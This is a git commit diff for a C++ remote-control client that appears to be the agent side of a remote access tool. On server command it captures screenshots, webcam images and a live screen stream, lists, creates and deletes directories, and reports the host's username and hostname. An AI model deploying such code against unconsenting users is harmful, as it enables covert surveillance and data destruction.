25ab5c6aad8c6bbdf92cb13bc327227738f61d15
Pine Apple <loucro.bro@gmail.com>
2021-08-05 11:53:25 +0200

    refactored admin shell

--- Client/include/Client.h
+++ Client/include/Client.h
@@ -12,57 +12,71 @@
 
 #include <core/Util.h>
 
-namespace silence {
-class Client {
-public:
-  using CommandObject = std::map<std::string, sio::message::ptr>;
+namespace silence
+{
+    class Client
+    {
+    public:
+        using CommandObject = std::map<std::string, sio::message::ptr>;
 
-  explicit Client(std::string url);
-  ~Client();
+        explicit Client(std::string url);
+        ~Client();
 
-  void connect();
+        void connect();
 
-private:
-  void onConnected(const std::string &nsp);
+    private:
+        void onConnected(const std::string &nsp);
 
-  void onFailed();
+        void onFailed();
 
-  void onClosed(sio::client::close_reason const &reason);
+        void onClosed(sio::client::close_reason const &reason);
 
-private:
-  sio::message::list createObject(const CommandObject &object);
+    private:
+        sio::message::list createObject(const CommandObject &object);
 
-  template <typename T, typename... Args>
-  void launchEvent(const std::function<T> &callable, Args &&...args);
+        template<typename T, typename... Args>
+        void launchEvent(const std::function<T> &callable, Args &&...args);
 
-private:
-  void onCommand(std::string const &name, sio::message::ptr const &data,
-                 bool hasAck, sio::message::list &ack_resp);
+    private:
+        void onCommand(std::string const &name, sio::message::ptr const &data,
+                       bool hasAck, sio::message::list &ack_resp);
 
-private:
-  void greetEvent();       // starts the client
-  void screenshotEvent();  // takes a screenshot
-  void webcamShotEvent();  // takes a webcam shot
-  void killStreamEvent();  // kills a stream
-  void startStreamEvent(); // creates a stream
+    private:
+        void greetEvent();      // starts the client
+        void screenshotEvent(); // takes a screenshot
+        void webcamShotEvent(); // takes a webcam shot
+        void killStreamEvent(); // kills a stream
+        void startStreamEvent();// creates a stream
 
-  void listDirEvent(const CommandObject &object); // lists a directory
-  void mkDirEvent(const CommandObject &object);   // creates a directory
-  void removeEvent(const CommandObject &object);  // removes a directory
+        void listDirEvent(const CommandObject &object);// lists a directory
+        void mkDirEvent(const CommandObject &object);  // creates a directory
+        void removeEvent(const CommandObject &object); // removes a directory
 
-  void error(const std::string &event, const std::string &msg);
-  void info(const std::string &info);
-  void response(const std::string &event, const sio::message::list &msg);
+        void error(const std::string &event, const std::string &msg);
+        void info(const std::string &info);
+        void response(const std::string &event, const sio::message::list &msg);
 
-private:
-  std::string mUrl;
-  std::unique_ptr<sio::client> mIO;
-  std::mutex mLock;
-  std::mutex mStreamLocker;
+    private:
+        std::string mUrl;
+        std::unique_ptr<sio::client> mIO;
+        std::mutex mLock;
+        std::mutex mStreamLocker;
 
-  std::condition_variable_any mCond;
-  bool mStreamRunning{false};
+        std::condition_variable_any mCond;
+        bool mStreamRunning{false};
 
-  sio::socket::ptr mSocket;
-};
-} // namespace silence
+        sio::socket::ptr mSocket;
+
+    private:
+        std::string mUsername;
+        std::string mHostname;
+
+#if defined(__linux__)
+        std::string mOS{"Linux"};
+#elif defined(_WIN32)
+        std::string mOS{"Windows"};
+#else
+        std::string mOS{"MacOS"};
+#endif
+    };
+}// namespace silence
--- Client/src/Client.cpp
+++ Client/src/Client.cpp
@@ -4,176 +4,198 @@
 #define SIOBOOL(boolean) sio::bool_message::create(boolean)
 #define SIOBIN(bin) sio::binary_message::create(bin)
 
-namespace silence {
-Client::Client(std::string url) : mUrl(std::move(url)), mIO(new sio::client()) {
-  mSocket = mIO->socket();
+namespace silence
+{
+    Client::Client(std::string url)
+        : mUrl(std::move(url)), mIO(new sio::client()),
+          mUsername(impl::username()), mHostname(impl::hostname())
+    {
+        mSocket = mIO->socket();
 
-  mSocket->on("command",
-              [this](auto &&PH1, auto &&PH2, auto &&PH3, auto &&PH4) {
-                onCommand(std::forward<decltype(PH1)>(PH1),
-                          std::forward<decltype(PH2)>(PH2),
-                          std::forward<decltype(PH3)>(PH3),
-                          std::forward<decltype(PH4)>(PH4));
-              });
+        mSocket->on("command",
+                    [this](auto &&PH1, auto &&PH2, auto &&PH3, auto &&PH4) {
+                        onCommand(std::forward<decltype(PH1)>(PH1),
+                                  std::forward<decltype(PH2)>(PH2),
+                                  std::forward<decltype(PH3)>(PH3),
+                                  std::forward<decltype(PH4)>(PH4));
+                    });
 
-  mIO->set_socket_open_listener(
-      [this](auto &&PH1) { onConnected(std::forward<decltype(PH1)>(PH1)); });
-  mIO->set_close_listener(
-      [this](auto &&PH1) { onClosed(std::forward<decltype(PH1)>(PH1)); });
-  mIO->set_fail_listener([this] { onFailed(); });
-}
+        mIO->set_socket_open_listener(
+                [this](auto &&PH1) { onConnected(std::forward<decltype(PH1)>(PH1)); });
+        mIO->set_close_listener(
+                [this](auto &&PH1) { onClosed(std::forward<decltype(PH1)>(PH1)); });
+        mIO->set_fail_listener([this] { onFailed(); });
+    }
 
-Client::~Client() {
-  mSocket->off_all();
-  mSocket->off_error();
+    Client::~Client()
+    {
+        mSocket->off_all();
+        mSocket->off_error();
 
-  mLock.lock();
-  mCond.notify_all();
-  mLock.unlock();
-}
+        mLock.lock();
+        mCond.notify_all();
+        mLock.unlock();
+    }
 
-void Client::connect() {
-  mIO->connect(mUrl);
-  mLock.lock();
-  mCond.wait(mLock);
-  mLock.unlock();
-}
+    void Client::connect()
+    {
+        mIO->connect(mUrl);
+        mLock.lock();
+        mCond.wait(mLock);
+        mLock.unlock();
+    }
 
-void Client::onConnected(const std::string &nsp) {
-  std::cout << "Connected with server on nsp: " << nsp << std::endl;
-}
+    void Client::onConnected(const std::string &nsp)
+    {
+        std::cout << "Connected with server on nsp: " << nsp << std::endl;
+    }
 
-void Client::onFailed() { std::cout << "sio failed" << std::endl; }
+    void Client::onFailed() { std::cout << "sio failed" << std::endl; }
 
-void Client::onClosed(sio::client::close_reason const &reason) {
-  std::cout << reason << std::endl;
-  std::cout << "sio closed" << std::endl;
-}
+    void Client::onClosed(sio::client::close_reason const &reason)
+    {
+        std::cout << reason << std::endl;
+        std::cout << "sio closed" << std::endl;
+    }
 
-sio::message::list Client::createObject(const CommandObject &object) {
-  auto obj = sio::object_message::create();
-  obj->get_map() = object;
-  return obj;
-}
+    sio::message::list Client::createObject(const CommandObject &object)
+    {
+        auto obj = sio::object_message::create();
+        obj->get_map() = object;
+        return obj;
+    }
 
-template <typename T, typename... Args>
-void Client::launchEvent(const std::function<T> &callable, Args &&...args) {
-  std::thread thread{callable, args...};
-  thread.detach();
-}
+    template<typename T, typename... Args>
+    void Client::launchEvent(const std::function<T> &callable, Args &&...args)
+    {
+        std::thread thread{callable, args...};
+        thread.detach();
+    }
 
-void Client::onCommand(std::string const &name, sio::message::ptr const &data,
-                       bool hasAck, sio::message::list &ack_resp) {
-  auto commandObject = data->get_map();
-  std::string event = commandObject["event"]->get_string();
+    void Client::onCommand(std::string const &name, sio::message::ptr const &data,
+                           bool hasAck, sio::message::list &ack_resp)
+    {
+        auto commandObject = data->get_map();
+        std::string event = commandObject["event"]->get_string();
 
-  if (event == "greet")
-    greetEvent();
-  else if (event == "start_stream")
-    launchEvent<void()>([this] { startStreamEvent(); }); // launch in new thread
-  else if (event == "kill_stream")
-    killStreamEvent();
-  else if (event == "screenshot")
-    screenshotEvent();
-  else if (event == "webcamshot")
-    webcamShotEvent();
-  else if (event == "listdir")
-    listDirEvent(commandObject);
-  else if (event == "mkdir")
-    mkDirEvent(commandObject);
-  else if (event == "remove")
-    removeEvent(commandObject);
-  else
-    error(event, "Unknown event");
-}
+        if (event == "greet")
+            greetEvent();
+        else if (event == "start_stream")
+            launchEvent<void()>([this] { startStreamEvent(); });// launch in new thread
+        else if (event == "kill_stream")
+            killStreamEvent();
+        else if (event == "screenshot")
+            screenshotEvent();
+        else if (event == "webcamshot")
+            webcamShotEvent();
+        else if (event == "listdir")
+            listDirEvent(commandObject);
+        else if (event == "mkdir")
+            mkDirEvent(commandObject);
+        else if (event == "remove")
+            removeEvent(commandObject);
+        else
+            error(event, "Unknown event");
+    }
 
-void Client::greetEvent() {
-  mSocket->emit("add_client", createObject({{"hostname", SIOSTR("hostname")},
-                                            {"username", SIOSTR("username")},
-                                            {"os", SIOSTR("linux")}}));
-}
+    void Client::greetEvent()
+    {
+        mSocket->emit("add_client", createObject({{"hostname", SIOSTR(mHostname)},
+                                                  {"username", SIOSTR(mUsername)},
+                                                  {"os", SIOSTR(mOS)}}));
+    }
 
-void Client::screenshotEvent() {
-  impl::Screenshot screen;
-  cv::Mat image{screen.take()};
+    void Client::screenshotEvent()
+    {
+        impl::Screenshot screen;
+        cv::Mat image{screen.take()};
 
-  response("screenshot", SIOBIN(impl::toBinaryString(image)));
-}
+        response("screenshot", SIOBIN(impl::toBinaryString(image)));
+    }
 
-void Client::webcamShotEvent() {
-  try {
-    cv::VideoCapture camera;
-    cv::Mat image;
+    void Client::webcamShotEvent()
+    {
+        try {
+            cv::VideoCapture camera;
+            cv::Mat image;
 
-    camera.read(image);
-    response("webcamshot", SIOBIN(impl::toBinaryString(image)));
-  } catch (cv::Exception &) {
-    error("webcamshot", "No camera found");
-  }
-}
+            camera.read(image);
+            response("webcamshot", SIOBIN(impl::toBinaryString(image)));
+        } catch (cv::Exception &) {
+            error("webcamshot", "No camera found");
+        }
+    }
 
-void Client::killStreamEvent() {
-  std::unique_lock<std::mutex> lockGuard(mStreamLocker);
+    void Client::killStreamEvent()
+    {
+        std::unique_lock<std::mutex> lockGuard(mStreamLocker);
 
-  if (!mStreamRunning) {
-    error("kill_stream", "Stream is not running");
-    return;
-  }
+        if (!mStreamRunning) {
+            error("kill_stream", "Stream is not running");
+            return;
+        }
 
-  mStreamRunning = false;
-  response("kill_stream", SIOBOOL(true));
-}
+        mStreamRunning = false;
+        response("kill_stream", SIOBOOL(true));
+    }
 
-void Client::startStreamEvent() {
-  std::unique_lock<std::mutex> lockGuard(mStreamLocker);
-  if (mStreamRunning) {
-    error("start_stream", "Stream is running");
-    return;
-  }
-  mStreamRunning = true;
-  lockGuard.unlock();
+    void Client::startStreamEvent()
+    {
+        std::unique_lock<std::mutex> lockGuard(mStreamLocker);
+        if (mStreamRunning) {
+            error("start_stream", "Stream is running");
+            return;
+        }
+        mStreamRunning = true;
+        lockGuard.unlock();
 
-  response("start_stream", SIOSTR("Started stream"));
-  impl::Screenshot screen;
-  while (true) {
-    lockGuard.lock();
-    if (!mStreamRunning)
-      return;
-    lockGuard.unlock();
+        response("start_stream", SIOSTR("Started stream"));
+        impl::Screenshot screen;
+        while (true) {
+            lockGuard.lock();
+            if (!mStreamRunning)
+                return;
+            lockGuard.unlock();
 
-    cv::Mat image{screen.take()};
-    mSocket->emit("frame", impl::toBinaryString(image));
-  }
-}
+            cv::Mat image{screen.take()};
+            mSocket->emit("frame", impl::toBinaryString(image));
+        }
+    }
 
-void Client::listDirEvent(const CommandObject &object) {
-  auto dirList = sio::array_message::create();
-  for (const auto &path : impl::listdir(object.at("path")->get_string()))
-    dirList->get_vector().push_back(SIOSTR(path.string()));
+    void Client::listDirEvent(const CommandObject &object)
+    {
+        auto dirList = sio::array_message::create();
+        for (const auto &path : impl::listdir(object.at("path")->get_string()))
+            dirList->get_vector().push_back(SIOSTR(path.string()));
 
-  response("listdir", dirList);
-}
+        response("listdir", dirList);
+    }
 
-void Client::mkDirEvent(const CommandObject &object) {
-  response("mkdir",
-           SIOBOOL(fs::create_directories(object.at("path")->get_string())));
-}
+    void Client::mkDirEvent(const CommandObject &object)
+    {
+        response("mkdir",
+                 SIOBOOL(fs::create_directories(object.at("path")->get_string())));
+    }
 
-void Client::removeEvent(const CommandObject &object) {
-  response("remove", SIOBOOL(fs::remove(object.at("path")->get_string())));
-}
+    void Client::removeEvent(const CommandObject &object)
+    {
+        response("remove", SIOBOOL(fs::remove(object.at("path")->get_string())));
+    }
 
-void Client::error(const std::string &event, const std::string &msg) {
-  mSocket->emit("error",
-                createObject({{"event", SIOSTR(event)}, {"msg", SIOSTR(msg)}}));
-}
+    void Client::error(const std::string &event, const std::string &msg)
+    {
+        mSocket->emit("error",
+                      createObject({{"event", SIOSTR(event)}, {"msg", SIOSTR(msg)}}));
+    }
 
-void Client::info(const std::string &info) {
-  mSocket->emit("info", createObject({{"msg", SIOSTR(info)}}));
-}
+    void Client::info(const std::string &info)
+    {
+        mSocket->emit("info", createObject({{"msg", SIOSTR(info)}}));
+    }
 
-void Client::response(const std::string &event, const sio::message::list &msg) {
-  mSocket->emit("response",
-                createObject({{"event", SIOSTR(event)}, {"data", msg[0]}}));
-}
-} // namespace silence
+    void Client::response(const std::string &event, const sio::message::list &msg)
+    {
+        mSocket->emit("response",
+                      createObject({{"event", SIOSTR(event)}, {"data", msg[0]}}));
+    }
+}// namespace silence
